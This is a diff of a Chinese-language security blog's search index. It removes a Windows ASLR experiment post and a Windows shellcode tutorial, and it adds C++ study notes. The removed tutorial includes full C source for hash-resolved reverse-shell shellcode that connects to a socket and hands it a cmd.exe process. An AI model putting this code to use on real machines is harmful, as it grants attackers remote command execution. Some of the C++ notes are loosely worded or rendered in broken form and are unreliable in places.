@@ -1,112 +1,198 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>ASLR in Windows</title>
-    <url>/2023/10/22/ASLR-in-Windows/</url>
-    <content><![CDATA[<p>众所周知，<code>ASLR</code>会使得<code>PE</code>文件的加载基址随机化，但有时候我们还是能够利用固定的地址，指向<code>kernel32.dll ntdll.dll</code>等<code>dll</code>文件中的特定指令，这是为什么呢？</p>
-<p>参考资料：</p>
-<ul>
-<li><p><a href="https://blog.csdn.net/weixin_43742894/article/details/105879904">ntdll 的内存加载位置</a></p>
-</li>
-<li><p><a href="http://www.nynaeve.net/?p=198">Why are certain DLLs required to be at the same base address system-wide? « Nynaeve</a></p>
-</li>
-</ul>
-<span id="more"></span>
-
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>Windows</code>和<code>Linux</code>下的<code>ASLR</code>区别很大。</p>
-<p>在<code>Linux</code>下，<code>ASLR</code>的实现分为两个部分</p>
-<ul>
-<li>系统部分，根据<code>/proc/sys/kernel/randomize_va_space</code>中设置的等级，影响 <code>栈、库、mmap、堆</code>（stack .so mmap heap）基址的随机性。</li>
-<li>编译器部分，由<code>PIE</code>选项决定编译得到程序是否是地址无关的，如果是，程序加载基址和全局数据地址（.text .data .bss）就可以随机化。</li>
-</ul>
-<p>在<code>Windwos</code>下，<code>ASLR</code>可由 <code>Visual Studio</code> 下的一个链接器选项——随机基址（<code>/DYNAMICBASE</code>）控制。</p>
-<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><h3 id="ASLR与程序基址的关系"><a href="#ASLR与程序基址的关系" class="headerlink" title="ASLR与程序基址的关系"></a>ASLR与程序基址的关系</h3><h4 id="开启ASLR"><a href="#开启ASLR" class="headerlink" title="开启ASLR"></a>开启ASLR</h4><p>使用visual studio生成一个可执行程序<code>Exploime.exe</code>，开启随机基址</p>
-<p><img src="/../pic/ASLR-in-Windows/ASLR-YES.png" alt="ASLR open"></p>
-<p>使用windbg加载<code>Exploime.exe</code>，然后使用<code>lm</code>命令查看已加载模块的基址</p>
-<p><img src="/../pic/ASLR-in-Windows/pic1.png" alt="pic1"></p>
-<p>重启windbg，重复上面操作</p>
-<p><img src="/../pic/ASLR-in-Windows/pic2.png" alt="pic2"></p>
-<p>发现，和之前一样。</p>
-<p>重启电脑，再来一次，得到</p>
-<p><img src="/../pic/ASLR-in-Windows/pic3.png" alt="pic3"></p>
-<p>发现各个基址出现变化。</p>
-<h4 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h4><p>关闭随机基址，重新生成<code>Exploime.exe</code></p>
-<p><img src="/../pic/ASLR-in-Windows/ASLR-NO.png" alt="ASLR open"></p>
-<p>使用windbg加载<code>Exploime.exe</code>，然后使用<code>lm</code>命令查看已加载模块的基址</p>
-<p><img src="/../pic/ASLR-in-Windows/pic4.png" alt="pic4"></p>
-<p>重启windbg，重复上面操作</p>
-<p><img src="/../pic/ASLR-in-Windows/pic5.png" alt="pic5"></p>
-<p>和上面一致，重启电脑，再来一次，得到</p>
-<p><img src="/../pic/ASLR-in-Windows/pic6.png" alt="pic6"></p>
-<p>发现关闭了<code>ASLR</code>的模块（<code>Exploitme</code>）基址没有变化，其余默认开启了<code>ASLR</code>的系统模块基址发生了变化。</p>
-<h3 id="ASLR与堆栈基址的关系"><a href="#ASLR与堆栈基址的关系" class="headerlink" title="ASLR与堆栈基址的关系"></a>ASLR与堆栈基址的关系</h3><h4 id="开启ASLR-1"><a href="#开启ASLR-1" class="headerlink" title="开启ASLR"></a>开启ASLR</h4><p>开启<code>ASLR</code>后，可以看出两次运行堆栈地址的变化：</p>
-<p><img src="/../pic/ASLR-in-Windows/address_aslr_1.png" alt="address_aslr_1"></p>
-<p><img src="/../pic/ASLR-in-Windows/address_aslr_2.png" alt="address_aslr_2"></p>
-<h4 id="关闭ASLR-1"><a href="#关闭ASLR-1" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h4><p>未开启<code>ASLR</code>时，两次运行程序，查看堆栈地址结果如下，完全一致，不过可以看出其他模块的ASLR还是发挥了作用的：</p>
-<p><img src="/../pic/ASLR-in-Windows/address1.png" alt="address1"></p>
-<p><img src="/../pic/ASLR-in-Windows/address2.png" alt="address2"></p>
-<h3 id="静态比较"><a href="#静态比较" class="headerlink" title="静态比较"></a>静态比较</h3><p>使用<code>Lord PE</code>查看开启<code>ASLR</code>与不开启<code>ASLR</code>程序节的区别，发现前者比后者多一个<code>.reloc</code>节，用于存储重定位信息。</p>
-<p><img src="/../pic/ASLR-in-Windows/sections_aslr.png" alt="sections_aslr"></p>
-<p><img src="/../pic/ASLR-in-Windows/section_noaslr.png" alt="section_noaslr"></p>
-<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><h3 id="ASLR与程序基址之间的关系"><a href="#ASLR与程序基址之间的关系" class="headerlink" title="ASLR与程序基址之间的关系"></a>ASLR与程序基址之间的关系</h3><p>Windows（至少Win10）下的<code>ASLR</code>机制，对程序基址的影响，只在系统启动时发挥作用，系统运行过程中，各个模块的基址不会变化。</p>
-<p>（和我预想中不太一样，本来以为只有特定的dll是这样，但是上面可以看到一个普通的可执行程序<code>Exploitme</code>也是这样）。</p>
-<h3 id="ASLR与堆栈基址之间的关系"><a href="#ASLR与堆栈基址之间的关系" class="headerlink" title="ASLR与堆栈基址之间的关系"></a>ASLR与堆栈基址之间的关系</h3><p>Windows（至少Win10）下，开启<code>ASLR</code>后，程序的堆栈基址每次运行时都是随机的。</p>
-]]></content>
-      <categories>
-        <category>Windows-PWN</category>
-      </categories>
-  </entry>
-  <entry>
     <title>AWD跳板机搭建</title>
-    <url>/2023/10/19/AWD%E8%B7%B3%E6%9D%BF%E6%9C%BA%E6%90%AD%E5%BB%BA/</url>
+    <url>/2023/10/19/CTF-Skills/AWD%E8%B7%B3%E6%9D%BF%E6%9C%BA%E6%90%AD%E5%BB%BA/</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>Create Shellcode in Windows</title>
-    <url>/2023/10/20/Create-Shellcode-in-Windows/</url>
-    <content><![CDATA[<p>讲解windwos下开发位置无关shellcode的基础知识，并构建框架代码和提取脚本。</p>
-<p>参考链接：</p>
-<ul>
-<li><a href="https://tttang.com/archive/901/">Exploit开发系列教程-Windows基础&amp;shellcode)</a></li>
-</ul>
+    <title>Learning-C++</title>
+    <url>/2023/10/29/LearningNotes/Learning-Cpp/</url>
+    <content><![CDATA[<p>c++学习笔记。</p>
 <span id="more"></span>
 
-<h2 id="理论准备"><a href="#理论准备" class="headerlink" title="理论准备"></a>理论准备</h2><p>一个好的<code>shellcode</code>，应该满足以下几个条件：</p>
+<h2 id="基础新特性"><a href="#基础新特性" class="headerlink" title="基础新特性"></a>基础新特性</h2><ul>
+<li><p>命名空间 namespace</p>
+</li>
+<li><p>类型增强</p>
 <ul>
-<li><p>不包含“<code>\X00</code>“：避免<code>shellcode</code>被截断</p>
+<li><p>常量</p>
+<ul>
+<li><p>const</p>
+<ul>
+<li><p>常量指针</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span>* p = <span class="string">&quot;hello world&quot;</span>; <span class="comment">// const char* == char const*</span></span><br><span class="line">p[<span class="number">0</span>] = <span class="string">&#x27;H&#x27;</span>; <span class="comment">// 出错，常量指针，指向的是常量，无法通过常量指针修改所指内容</span></span><br></pre></td></tr></table></figure>
 </li>
-<li><p>不能直接调用Windows API，而应该从<code>Windows</code>的数据结构体中寻找需要的函数。</p>
+<li><p>指针常量</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="type">const</span> p = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">p++; <span class="comment">// 出错，指针常量，无法修改p的值</span></span><br><span class="line">p[<span class="number">0</span>] = <span class="string">&#x27;H&#x27;</span>; <span class="comment">// 但可以修改所指向的内容</span></span><br></pre></td></tr></table></figure></li>
+</ul>
 </li>
-<li><p>自包含：仅使用栈变量</p>
-<p>错误写法：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char *v = char[100];</span><br><span class="line">char v[] = &quot;hello world&quot;; # 存储在.rdata节</span><br><span class="line">char *v = &quot;hello world&quot;; # 存储在.data节</span><br></pre></td></tr></table></figure>
-
-<p>正确写法：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char str[] = &#123; &#x27;I&#x27;, &#x27;\&#x27;&#x27;, &#x27;m&#x27;, &#x27; &#x27;, &#x27;a&#x27;, &#x27; &#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;r&#x27;, &#x27;i&#x27;, &#x27;n&#x27;, &#x27;g&#x27;, &#x27;\0&#x27; &#125;;</span><br></pre></td></tr></table></figure>
-
-<p>但当字符串过长时，仍会将字符串放到.rdata节，这个就需要使用<code>python</code>脚本从<code>.rdata</code>中将字符串提取出来，同时修改重定位信息，以修复<code>shellcode</code>。</p>
+<li><p>constexpr: 编译时求值</p>
 </li>
 </ul>
-<h2 id="开始实践"><a href="#开始实践" class="headerlink" title="开始实践"></a>开始实践</h2><h3 id="配置选项"><a href="#配置选项" class="headerlink" title="配置选项"></a>配置选项</h3><p>编译选项</p>
-<ul>
-<li>1</li>
+</li>
+<li><p>bool</p>
+</li>
+<li><p>enum</p>
+</li>
+<li><ul>
+<li></li>
 </ul>
-<p>链接选项</p>
-<ul>
-<li>2</li>
+</li>
 </ul>
-<h3 id="shellcode范例"><a href="#shellcode范例" class="headerlink" title="shellcode范例"></a>shellcode范例</h3><p>一个简单的<code>reverse shell</code>：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span>               <span class="comment">// must preceed #include &lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> htons(A) ((((WORD)(A) &amp; 0xff00) &gt;&gt; 8) | (((WORD)(A) &amp; 0x00ff) &lt;&lt; 8))</span></span><br><span class="line"> </span><br><span class="line">_inline PEB *<span class="title function_">getPEB</span><span class="params">()</span> &#123;</span><br><span class="line">    PEB *p;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov     eax, fs:[<span class="number">30</span>h]</span><br><span class="line">        mov     p, eax</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">DWORD <span class="title function_">getHash</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    DWORD h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*str) &#123;</span><br><span class="line">        h = (h &gt;&gt; <span class="number">13</span>) | (h &lt;&lt; (<span class="number">32</span> - <span class="number">13</span>));       <span class="comment">// ROR h, 13</span></span><br><span class="line">        h += *str &gt;= <span class="string">&#x27;a&#x27;</span> ? *str - <span class="number">32</span> : *str;    <span class="comment">// convert the character to uppercase</span></span><br><span class="line">        str++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">DWORD <span class="title function_">getFunctionHash</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *moduleName, <span class="type">const</span> <span class="type">char</span> *functionName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getHash(moduleName) + getHash(functionName);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">LDR_DATA_TABLE_ENTRY *<span class="title function_">getDataTableEntry</span><span class="params">(<span class="type">const</span> LIST_ENTRY *ptr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);</span><br><span class="line">    <span class="keyword">return</span> (LDR_DATA_TABLE_ENTRY *)((BYTE *)ptr - list_entry_offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> This function doesn&#x27;t work with forwarders. For instance, kernel32.ExitThread forwards to</span></span><br><span class="line"><span class="comment">//       ntdll.RtlExitUserThread. The solution is to follow the forwards manually.</span></span><br><span class="line">PVOID <span class="title function_">getProcAddrByHash</span><span class="params">(DWORD hash)</span> &#123;</span><br><span class="line">    PEB *peb = getPEB();</span><br><span class="line">    LIST_ENTRY *first = peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;</span><br><span class="line">    LIST_ENTRY *ptr = first;</span><br><span class="line">    <span class="keyword">do</span> &#123;                            <span class="comment">// for each module</span></span><br><span class="line">        LDR_DATA_TABLE_ENTRY *dte = getDataTableEntry(ptr);</span><br><span class="line">        ptr = ptr-&gt;Flink;</span><br><span class="line"> </span><br><span class="line">        BYTE *baseAddress = (BYTE *)dte-&gt;DllBase;</span><br><span class="line">        <span class="keyword">if</span> (!baseAddress)           <span class="comment">// invalid module(???)</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)baseAddress;</span><br><span class="line">        IMAGE_NT_HEADERS *ntHeaders = (IMAGE_NT_HEADERS *)(baseAddress + dosHeader-&gt;e_lfanew);</span><br><span class="line">        DWORD iedRVA = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class="line">        <span class="keyword">if</span> (!iedRVA)                <span class="comment">// Export Directory not present</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        IMAGE_EXPORT_DIRECTORY *ied = (IMAGE_EXPORT_DIRECTORY *)(baseAddress + iedRVA);</span><br><span class="line">        <span class="type">char</span> *moduleName = (<span class="type">char</span> *)(baseAddress + ied-&gt;Name);</span><br><span class="line">        DWORD moduleHash = getHash(moduleName);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// The arrays pointed to by AddressOfNames and AddressOfNameOrdinals run in parallel, i.e. the i-th</span></span><br><span class="line">        <span class="comment">// element of both arrays refer to the same function. The first array specifies the name whereas</span></span><br><span class="line">        <span class="comment">// the second the ordinal. This ordinal can then be used as an index in the array pointed to by</span></span><br><span class="line">        <span class="comment">// AddressOfFunctions to find the entry point of the function.</span></span><br><span class="line">        DWORD *nameRVAs = (DWORD *)(baseAddress + ied-&gt;AddressOfNames);</span><br><span class="line">        <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; ied-&gt;NumberOfNames; ++i) &#123;</span><br><span class="line">            <span class="type">char</span> *functionName = (<span class="type">char</span> *)(baseAddress + nameRVAs[i]);</span><br><span class="line">            <span class="keyword">if</span> (hash == moduleHash + getHash(functionName)) &#123;</span><br><span class="line">                WORD ordinal = ((WORD *)(baseAddress + ied-&gt;AddressOfNameOrdinals))[i];</span><br><span class="line">                DWORD functionRVA = ((DWORD *)(baseAddress + ied-&gt;AddressOfFunctions))[ordinal];</span><br><span class="line">                <span class="keyword">return</span> baseAddress + functionRVA;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (ptr != first);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;            <span class="comment">// address not found</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_LoadLibraryA           0xf8b7108d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WSAStartup             0x2ddcd540</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WSACleanup             0x0b9d13bc</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WSASocketA             0x9fd4f16f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WSAConnect             0xa50da182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_CreateProcessA         0x231cbe70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_inet_ntoa              0x1b73fed1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_inet_addr              0x011bfae2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_getaddrinfo            0xdc2953c9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_getnameinfo            0x5c1c856e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_ExitThread             0x4b3153e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_WaitForSingleObject    0xca8e9498</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DefineFuncPtr(name)     decltype(name) *My_##name = (decltype(name) *)getProcAddrByHash(HASH_##name)</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">entryPoint</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//  printf(&quot;0x%08x\n&quot;, getFunctionHash(&quot;kernel32.dll&quot;, &quot;WaitForSingleObject&quot;));</span></span><br><span class="line"><span class="comment">//  return 0;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> we should call WSACleanup() and freeaddrinfo() (after getaddrinfo()), but</span></span><br><span class="line">    <span class="comment">//       they&#x27;re not strictly needed.</span></span><br><span class="line"> </span><br><span class="line">    DefineFuncPtr(LoadLibraryA);</span><br><span class="line"> </span><br><span class="line">    My_LoadLibraryA(<span class="string">&quot;ws2_32.dll&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    DefineFuncPtr(WSAStartup);</span><br><span class="line">    DefineFuncPtr(WSASocketA);</span><br><span class="line">    DefineFuncPtr(WSAConnect);</span><br><span class="line">    DefineFuncPtr(CreateProcessA);</span><br><span class="line">    DefineFuncPtr(inet_ntoa);</span><br><span class="line">    DefineFuncPtr(inet_addr);</span><br><span class="line">    DefineFuncPtr(getaddrinfo);</span><br><span class="line">    DefineFuncPtr(getnameinfo);</span><br><span class="line">    DefineFuncPtr(ExitThread);</span><br><span class="line">    DefineFuncPtr(WaitForSingleObject);</span><br><span class="line"> </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hostName = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> hostPort = <span class="number">123</span>;</span><br><span class="line"> </span><br><span class="line">    WSADATA wsaData;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (My_WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData))</span><br><span class="line">        <span class="keyword">goto</span> __end;         <span class="comment">// error</span></span><br><span class="line">    SOCKET sock = My_WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sock == INVALID_SOCKET)</span><br><span class="line">        <span class="keyword">goto</span> __end;</span><br><span class="line"> </span><br><span class="line">    addrinfo *result;</span><br><span class="line">    <span class="keyword">if</span> (My_getaddrinfo(hostName, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;result))</span><br><span class="line">        <span class="keyword">goto</span> __end;</span><br><span class="line">    <span class="type">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">    My_getnameinfo(result-&gt;ai_addr, result-&gt;ai_addrlen, ip_addr, <span class="keyword">sizeof</span>(ip_addr), <span class="literal">NULL</span>, <span class="number">0</span>, NI_NUMERICHOST);</span><br><span class="line"> </span><br><span class="line">    SOCKADDR_IN remoteAddr;</span><br><span class="line">    remoteAddr.sin_family = AF_INET;</span><br><span class="line">    remoteAddr.sin_port = htons(hostPort);</span><br><span class="line">    remoteAddr.sin_addr.s_addr = My_inet_addr(ip_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (My_WSAConnect(sock, (SOCKADDR *)&amp;remoteAddr, <span class="keyword">sizeof</span>(remoteAddr), <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">        <span class="keyword">goto</span> __end;</span><br><span class="line"> </span><br><span class="line">    STARTUPINFOA sInfo;</span><br><span class="line">    PROCESS_INFORMATION procInfo;</span><br><span class="line">    SecureZeroMemory(&amp;sInfo, <span class="keyword">sizeof</span>(sInfo));        <span class="comment">// avoids a call to _memset</span></span><br><span class="line">    sInfo.cb = <span class="keyword">sizeof</span>(sInfo);</span><br><span class="line">    sInfo.dwFlags = STARTF_USESTDHANDLES;</span><br><span class="line">    sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)sock;</span><br><span class="line">    My_CreateProcessA(<span class="literal">NULL</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;sInfo, &amp;procInfo);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Waits for the process to finish.</span></span><br><span class="line">    My_WaitForSingleObject(procInfo.hProcess, INFINITE);</span><br><span class="line"> </span><br><span class="line">__end:</span><br><span class="line">    My_ExitThread(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> entryPoint();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>运算符重载</p>
+<ul>
+<li>方便混合处理多种类型不同的值</li>
+</ul>
+</li>
+<li><p>变量初始化</p>
+<ul>
+<li>除了“&#x3D;”，还可以使用 <code>&#123;&#125;</code>和<code>()</code>进行初始化</li>
+</ul>
+</li>
+<li><p>auto</p>
+<ul>
+<li>编译期，自动类型推断</li>
+</ul>
+</li>
+<li><p>范围for语句</p>
+<ul>
+<li><pre><code class="c">for(auto x : v) &#123;&#125; // 存在内存复制操作
+for(auto &amp;x : v) &#123;&#125; // 省去了内存复制操作
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- new/delete</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    指针变量名 = new 类型名; // delete p;</span><br><span class="line">    指针变量名 = new 类型名(初值); // delete p;</span><br><span class="line">    指针变量名 = new 类型名[变量个数];	// delete[] p;</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>nullptr</p>
+<ul>
+<li>NULL : int 0</li>
+<li>nullptr : std::nullptr_t | void * 0</li>
+<li>nullptr &#x3D;&#x3D; NULL &#x3D;&#x3D; 0 √</li>
+</ul>
+</li>
+<li><p>强制类型转换</p>
+<ul>
+<li>static_cast</li>
+<li>dynamic_cast</li>
+<li>const_cast</li>
+<li>reinterpret_cast</li>
+</ul>
+</li>
+</ul>
+<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ul>
+<li><p>不占用内存，编译时转换为寄存器赋值</p>
+</li>
+<li><p>变量与引用的隐式转换</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int a = 10;</span><br><span class="line">int &amp;a1 = a; // 同一个变量，一般不额外占内存：变量-&gt;引用</span><br><span class="line">int &amp;a2 = a1; // 仍是同一个变量</span><br><span class="line">int b = a; // 创建新变量：变量-&gt;变量</span><br><span class="line">int b1 = a1; // 创建新变量：引用-&gt;变量</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>普通引用和常量引用</p>
+<ul>
+<li>不能通过常量引用修改变量</li>
+<li>作函数参数时，常量引用可以接收普通引用，但普通引用不能接收常量引用(常量)</li>
+</ul>
+</li>
+</ul>
+<h2 id="结构体和类"><a href="#结构体和类" class="headerlink" title="结构体和类"></a>结构体和类</h2><ul>
+<li><p>结构体struct</p>
+<ul>
+<li>除了成员变量，还可以拥有成员函数</li>
+</ul>
+</li>
+<li><p>权限修饰符</p>
+<ul>
+<li>public</li>
+<li>protected</li>
+<li>private</li>
+</ul>
+</li>
+<li><p>类class</p>
+<ul>
+<li>和结构体十分类似</li>
+<li>区别：结构体各成员默认public 类各成员默认private</li>
+</ul>
+</li>
+<li><p>代码组织结构</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">student.h ：类Student的定义</span><br><span class="line">student.cpp ：#include &quot;student.h&quot; + 类Student的定义</span><br><span class="line">other.cpp : #include &quot;student.h&quot;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="函数新特新"><a href="#函数新特新" class="headerlink" title="函数新特新"></a>函数新特新</h2><ul>
+<li><p>后置返回类型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto func(int, int);</span><br><span class="line">auto func(int, int) -&gt; int &#123;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>inline内联函数</p>
+<ul>
+<li>普通函数的定义一般放在.cpp文件，inline函数可以直接放在.h文件中（普通函数只能定义一次，但内联函数可以多次定义(得一致)）</li>
+<li>函数体代替函数调用，节省简单函数的调用开销</li>
+</ul>
+</li>
+<li><p>函数参数</p>
+<ul>
+<li><p>默认参数</p>
+</li>
+<li><p>空参，空着或者 void</p>
+</li>
+</ul>
+</li>
+<li><p>函数重载</p>
+<ul>
+<li><p>函数允许同名，但函数类型或参数要有明显区别</p>
+</li>
+<li><p>比较函数类型时，const关键字会被忽略</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="标准库"><a href="#标准库" class="headerlink" title="标准库"></a>标准库</h2><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><blockquote>
+<p>可变长字符串</p>
+</blockquote>
+<ul>
+<li><p>初始化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string s1;</span><br><span class="line">string s2 = &quot;hello world&quot;;</span><br><span class="line">string s3 = s2; // 存在拷贝</span><br><span class="line">string s4(&quot;hello world&quot;);</span><br><span class="line">string s5(6, &#x27;a&#x27;); // 连续6个&#x27;a&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>常用方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.empty()</span><br><span class="line">.size() .length()</span><br><span class="line">.c_str() // 返回一个指向string对象内部内容（正规c字符串，以&#x27;\0&#x27;结尾）的指针</span><br><span class="line">for(auto c : s) // 支持范围for，c的类型是char</span><br><span class="line">for(auto &amp;c : s) // 可以修改s中的字符</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>其它用法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[] == &gt; &lt; + &gt;&gt; &lt;&lt;</span><br><span class="line">+ 存在隐式类型转换，可以处理混合类型</span><br><span class="line">  s1+&#x27;a&#x27; s1+&quot;a&quot;+“b&quot; 允许</span><br><span class="line">  &quot;abc&quot; + &quot;def&quot; + s2 不允许，先执行前两项的相加，但他们现在的类型无法相加</span><br><span class="line">  </span><br><span class="line">.touppper() // 针对char?</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><blockquote>
+<p>可变长数组</p>
+</blockquote>
+<ul>
+<li><p>不能装引用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;int &amp;&gt; v; // 出错，引用在需要的时候加载到寄存器中，不占用内存</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>初始化</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; strv1; <span class="comment">// string默认初值为“”，int默认初值为0</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title function_">strv2</span><span class="params">(strv1)</span>; <span class="comment">// 存在内容拷贝 ()内部是vector时尝试拷贝，是整数时，认为是元素个数</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title function_">strv3</span><span class="params">(<span class="number">10</span>)</span>; <span class="comment">// 10个空字符串</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; strv3 = str1; <span class="comment">// 存在内容拷贝</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; strv3 = &#123;<span class="string">&quot;aaa&quot;</span>, <span class="string">&quot;bbb&quot;</span>, <span class="string">&quot;ccc&quot;</span>&#125;; <span class="comment">// c++11，使用初始化列表 &#123;&#125;内部数据一般被认为初始化列表，如果失败，可能会尝试认为它是元素个数。</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title function_">strv3</span><span class="params">(<span class="number">10</span>, <span class="string">&quot;abc&quot;</span>)</span>; <span class="comment">// 10个”abc</span></span><br></pre></td></tr></table></figure>
 
